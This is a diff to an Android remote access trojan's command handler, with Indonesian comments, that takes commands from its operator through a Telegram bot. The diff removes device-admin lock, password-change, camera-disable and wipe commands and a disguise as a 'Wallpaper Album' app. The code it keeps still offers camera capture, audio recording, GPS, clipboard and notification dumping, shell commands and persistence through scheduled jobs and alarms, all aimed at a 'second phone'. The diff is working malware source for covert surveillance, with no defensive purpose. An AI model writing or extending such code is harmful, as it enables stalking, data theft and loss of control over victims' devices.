@@ -2,7 +2,6 @@ package com.ratlab;
 
 import android.app.AlarmManager;
 import android.app.PendingIntent;
-import android.app.admin.DevicePolicyManager;
 import android.app.job.JobScheduler;
 import android.content.ComponentName;
 import android.content.Context;
@@ -44,7 +43,6 @@ public class CommandHandler {
     private final ShellModule shell;
     private final AudioModule audio;
     private final HideModule hide;
-    private final DeviceAdminModule admin;
 
     public CommandHandler(Context ctx, String token, long ownerId) {
         this.ctx = ctx;
@@ -63,7 +61,6 @@ public class CommandHandler {
         this.shell = new ShellModule(ctx);
         this.audio = new AudioModule(ctx);
         this.hide = new HideModule(ctx);
-        this.admin = new DeviceAdminModule(ctx);
     }
 
     public void pollUpdates() throws IOException {
@@ -111,16 +108,11 @@ public class CommandHandler {
 
     private String handleCommand(String cmd, String args) {
         try {
-            // Command khusus — tetep jalan walau paused
             switch (cmd) {
                 case "/stop":
                     return stopRat();
                 case "/resume":
                     return resumeRat();
-                case "/unadmin":
-                    return unadmin();
-                case "/admin":
-                    return admin();
             }
 
             if (paused && !cmd.equals("/start") && !cmd.equals("/help")) {
@@ -134,14 +126,13 @@ public class CommandHandler {
                             + "== KONTROL RAT ==\n"
                             + "/stop — pause RAT\n"
                             + "/resume — lanjutkan RAT\n"
-                            + "/unadmin — matiin Device Admin\n"
-                            + "/admin — nyalain Device Admin\n\n"
+                            + "/restart — restart service\n\n"
                             + "== INFO ==\n"
                             + "/ping /info /uptime /whoami /env\n\n"
                             + "== KAMERA ==\n"
                             + "/camera /camerafront\n\n"
                             + "== AUDIO ==\n"
-                            + "/play <url> /audio-max /speak <detik>\n"
+                            + "/play <url> /audio-max /speak <detik> /record <detik>\n"
                             + "/tts <teks> /volume <level> /vibrate <ms>\n\n"
                             + "== LOKASI ==\n"
                             + "/location /gps\n\n"
@@ -154,14 +145,7 @@ public class CommandHandler {
                             + "== JARINGAN ==\n"
                             + "/wifi /wifiscan /netstat /processes\n\n"
                             + "== KONTROL HP ==\n"
-                            + "/torch /brightness <level> /clipboard /notif\n\n"
-                            + "== STEALTH ==\n"
-                            + "/hide /unhide /restart\n\n"
-                            + "== DEVICE ADMIN ==\n"
-                            + "/lock [password] /force-lock <menit>\n"
-                            + "/change-password <password>\n"
-                            + "/disable-camera on|off\n"
-                            + "/reset /wipe";
+                            + "/torch /brightness <level> /clipboard /notif";
 
                 case "/ping":
                     return "Pong! Bot aktif. Paused: " + paused;
@@ -253,12 +237,6 @@ public class CommandHandler {
                 case "/notif":
                     return shell.exec("dumpsys notification --noredact 2>/dev/null | head -50");
 
-                case "/hide":
-                    return hide.hide();
-
-                case "/unhide":
-                    return hide.unhide();
-
                 case "/restart":
                     Intent svc = new Intent(ctx, BotService.class);
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -268,30 +246,6 @@ public class CommandHandler {
                     }
                     return "Service direstart.";
 
-                case "/lock":
-                    return admin.lock(args);
-
-                case "/force-lock":
-                    if (args.isEmpty()) return "Format: /force-lock <menit>";
-                    try {
-                        return admin.forceLock(Integer.parseInt(args));
-                    } catch (Exception e) {
-                        return "Format salah. Pakai angka: /force-lock 5";
-                    }
-
-                case "/change-password":
-                    if (args.isEmpty()) return "Format: /change-password <password>";
-                    return admin.changePassword(args);
-
-                case "/disable-camera":
-                    if (args.equals("on")) return admin.disableCamera(true);
-                    if (args.equals("off")) return admin.disableCamera(false);
-                    return "Format: /disable-camera on|off";
-
-                case "/reset":
-                case "/wipe":
-                    return admin.reset("");
-
                 default:
                     return null;
             }
@@ -300,18 +254,13 @@ public class CommandHandler {
         }
     }
 
-    // ============================================================
-    // STOP RAT — pause service + persistence
-    // ============================================================
     private String stopRat() {
         try {
             paused = true;
-
             try {
                 JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
                 if (js != null) js.cancelAll();
             } catch (Exception e) {}
-
             try {
                 AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
                 Intent ai = new Intent(ctx, AlarmReceiver.class);
@@ -319,31 +268,21 @@ public class CommandHandler {
                         PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
                 if (am != null) am.cancel(pi);
             } catch (Exception e) {}
-
-            return "RAT di-PAUSE.\n"
-                    + "- JobScheduler: OFF\n"
-                    + "- AlarmManager: OFF\n"
-                    + "- Command lain di-skip\n\n"
-                    + "Kirim /resume untuk lanjut.";
+            return "RAT di-PAUSE. Kirim /resume untuk lanjut.";
         } catch (Exception e) {
             return "Error stop: " + e.getMessage();
         }
     }
 
-    // ============================================================
-    // RESUME RAT
-    // ============================================================
     private String resumeRat() {
         try {
             paused = false;
-
             Intent svc = new Intent(ctx, BotService.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 ctx.startForegroundService(svc);
             } else {
                 ctx.startService(svc);
             }
-
             try {
                 JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
                 android.app.job.JobInfo job = new android.app.job.JobInfo.Builder(
@@ -354,7 +293,6 @@ public class CommandHandler {
                         .build();
                 if (js != null) js.schedule(job);
             } catch (Exception e) {}
-
             try {
                 AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
                 Intent ai = new Intent(ctx, AlarmReceiver.class);
@@ -362,61 +300,12 @@ public class CommandHandler {
                         PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
                 if (am != null) {
                     am.setRepeating(AlarmManager.RTC_WAKEUP,
-                            System.currentTimeMillis() + 60_000L,
-                            60_000L,
-                            pi);
+                            System.currentTimeMillis() + 60_000L, 60_000L, pi);
                 }
             } catch (Exception e) {}
-
-            return "RAT di-RESUME.\n"
-                    + "- Service: ON\n"
-                    + "- JobScheduler: ON\n"
-                    + "- AlarmManager: ON\n\n"
-                    + "Semua command aktif lagi.";
+            return "RAT di-RESUME. Service: ON.";
         } catch (Exception e) {
             return "Error resume: " + e.getMessage();
-        }
-    }
-
-    // ============================================================
-    // UNADMIN — matiin Device Admin (biar bisa uninstall)
-    // ============================================================
-    private String unadmin() {
-        try {
-            DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
-            ComponentName adminCn = new ComponentName(ctx, AdminReceiver.class);
-            if (dpm == null) return "DevicePolicyManager gak tersedia";
-            if (!dpm.isAdminActive(adminCn)) return "Device Admin udah mati.";
-            dpm.removeActiveAdmin(adminCn);
-            return "Device Admin DIMATIKAN.\n\n"
-                    + "Sekarang app bisa di-uninstall dari Settings HP kedua:\n"
-                    + "Settings → Apps → Wallpaper Album → Uninstall";
-        } catch (Exception e) {
-            return "Error unadmin: " + e.getMessage();
-        }
-    }
-
-    // ============================================================
-    // ADMIN — nyalain Device Admin lagi
-    // ============================================================
-    private String admin() {
-        try {
-            DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
-            ComponentName adminCn = new ComponentName(ctx, AdminReceiver.class);
-            if (dpm == null) return "DevicePolicyManager gak tersedia";
-            if (dpm.isAdminActive(adminCn)) return "Device Admin udah aktif.";
-            // Request via intent — cuma bisa dari activity, tapi kita coba dulu
-            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
-            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminCn);
-            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                    "Aktifkan untuk mengelola wallpaper.");
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            ctx.startActivity(intent);
-            return "Prompt Device Admin dikirim ke HP kedua.\n"
-                    + "Harus tap 'Aktifkan' di layar HP kedua.";
-        } catch (Exception e) {
-            return "Error admin: " + e.getMessage()
-                    + "\n\nNote: Device Admin harus diaktifin manual di HP kedua.";
         }
     }
 
@@ -425,7 +314,6 @@ public class CommandHandler {
             JSONObject body = new JSONObject();
             body.put("chat_id", chatId);
             body.put("text", text.length() > 4000 ? text.substring(0, 4000) : text);
-
             Request req = new Request.Builder()
                     .url("https://api.telegram.org/bot" + token + "/sendMessage")
                     .post(RequestBody.create(body.toString(), JSON))
